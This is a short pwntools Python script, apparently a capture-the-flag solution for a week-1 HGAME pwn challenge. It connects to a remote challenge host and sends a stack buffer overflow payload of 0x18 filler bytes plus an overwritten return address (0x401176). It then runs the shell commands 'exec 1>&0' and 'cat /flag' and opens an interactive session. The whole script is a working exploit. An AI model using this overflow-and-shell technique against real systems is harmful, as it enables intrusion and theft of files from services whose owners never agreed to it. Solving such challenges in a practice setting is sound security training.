from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln"])
sh = remote("week-1.hgame.lwsec.cn", 32331)

sh.send(b"A"*0x18 + p64(0x401176))

sh.sendline(b"exec 1>&0")
sh.sendline(b"cat /flag")

sh.interactive()